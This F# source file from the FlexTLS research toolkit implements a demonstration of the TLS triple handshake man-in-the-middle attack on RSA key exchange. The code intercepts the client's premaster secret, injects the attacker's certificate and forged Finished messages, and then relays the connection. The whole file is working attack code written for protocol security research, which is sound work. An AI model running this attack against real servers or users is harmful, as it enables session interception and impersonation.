(*
 * Copyright 2015 INRIA and Microsoft Corporation
 * 
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 * 
 *     http://www.apache.org/licenses/LICENSE-2.0
 * 
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *)

#light "off"

module FlexApps.Attack_TripleHandshake

open Bytes
open Error
open TLSInfo
open TLSConstants

open NLog

open FlexTLS
open FlexTypes
open FlexConstants
open FlexHandshake
open FlexConnection
open FlexClientHello
open FlexServerHello
open FlexCertificate
open FlexServerHelloDone
open FlexClientKeyExchange
open FlexCCS
open FlexFinished
open FlexState
open FlexSecrets
open FlexAlert

type Attack_TripleHandshake =
    class

    static member private logger = LogManager.GetCurrentClassLogger();

    static member runMITM (attacker_server_name:string, attacker_cn:string, attacker_port:int, server_name:string, ?port:int) : state * state =
        let port = defaultArg port FlexConstants.defaultTCPPort in
        match Cert.for_signing FlexConstants.sigAlgs_ALL attacker_cn FlexConstants.sigAlgs_RSA with
        | None -> failwith (perror __SOURCE_FILE__ __LINE__ (sprintf "Private key not found for the given CN: %s" attacker_cn))
        | Some(attacker_chain,_,_) -> Attack_TripleHandshake.runMITM(attacker_server_name,attacker_chain,attacker_port,server_name,port)

    static member runMITM (attacker_server_name:string, attacker_chain:Cert.chain, attacker_port:int, server_name:string, ?port:int) : state * state =
        let port = defaultArg port FlexConstants.defaultTCPPort in
        let attacker_cn =
            match Cert.get_hint attacker_chain with
            | None -> failwith (perror __SOURCE_FILE__ __LINE__ "Could not parse given certficate")
            | Some(cn) -> cn
        in

        // Start being a Man-In-The-Middle
        let sst,_,cst,_ = FlexConnection.MitmOpenTcpConnections(attacker_server_name,server_name,listen_port=attacker_port,server_cn=server_name,server_port=port) in

        // Receive client hello and ensure the client proposes at least one RSA key exchange ciphersuite
        let sst,snsc,sch = FlexClientHello.receive(sst) in
        match Handshake.negotiate (FlexClientHello.getCiphersuites sch) FlexConstants.defaultRSACiphersuites with
        | None -> failwith "Triple Handshake demo only implemented for RSA key exchange"
        | Some(rsa_kex_cs) ->

        // Reuse the honest client hello message, but enforce an RSA kex ciphersuite
        let cch = { sch with ciphersuites = Some([rsa_kex_cs]) } in
        let cst,cnsc,cch = FlexClientHello.send(cst,cch) in

        // Forward server hello, and get access to the honest server random
        let cst,cnsc,csh = FlexServerHello.receive(cst,cch,cnsc) in
        let sst,snsc,ssh = FlexServerHello.send(sst,sch,snsc,csh) in

        // Discard the server certificate and inject ours instead
        let cst,cnsc,ccert = FlexCertificate.receive(cst,Client,cnsc) in
        let sst,snsc,scert = FlexCertificate.send(sst,Server,attacker_chain,snsc) in

        // Forward the server hello done
        let cst,sst,shdpayload  = FlexHandshake.forward(cst,sst) in

        // Get the PMS from the client ...
        let sst,snsc,scke  = FlexClientKeyExchange.receiveRSA(sst,snsc,sch) in
        // ... flow it into the other connection ...
        let ckeys = {cnsc.secrets with kex = snsc.secrets.kex} in let cnsc = {cnsc with secrets = ckeys} in
        // ... and re-encrypt it to the server
        let cst,cnsc,ccke  = FlexClientKeyExchange.sendRSA(cst,cnsc,cch) in

        // Forward the client CCS
        let sst,cst,_ = FlexCCS.forward(sst,cst) in

        // Install secrets in one direction for each side of the MITM
        let sst = FlexState.installReadKeys  sst snsc in
        let cst = FlexState.installWriteKeys cst cnsc in

        // Compute the log of the handshake for each side of the MITM
        let slog = sch.payload @| ssh.payload @| scert.payload @| shdpayload @| scke.payload in
        let clog = cch.payload @| csh.payload @| ccert.payload @| shdpayload @| ccke.payload in

        // Discard the client finished message and inject ours instead
        let sst,sf = FlexFinished.receive(sst,snsc,Client) in
        let cst,cf = FlexFinished.send(cst,cnsc,Client) in

        // Forward the server CCS
        let cst,sst,_ = FlexCCS.forward(cst,sst) in

        // Install the keys in the other direction for each side of the MITM
        let cst = FlexState.installReadKeys cst cnsc in
        let sst = FlexState.installWriteKeys sst snsc in

        // Compute the log of the handshake
        let slog      = slog @| sf.payload in
        let clog      = clog @| cf.payload in

        // Discard the server finished message and inject ours instead
        let cst,_   = FlexFinished.receive(cst,cnsc,Server) in
        let sst,_   = FlexFinished.send(sst,snsc,Server) in

        // Put a nice end to the first handshake
        let sst = FlexAlert.send(sst,TLSError.AD_close_notify) in
        Tcp.close sst.ns;
        let cst = FlexAlert.send(cst,TLSError.AD_close_notify) in
        Tcp.close cst.ns;

        // Create two new Tcp connections as MITM
        let sst,_,cst,_ = FlexConnection.MitmOpenTcpConnections(attacker_server_name,server_name,listen_port=attacker_port,server_cn=server_name,server_port=port) in

        // Enter passthrough mode for the rest of the attack
        let _ = FlexConnection.passthrough(cst.ns,sst.ns) in
        sst,cst

    end
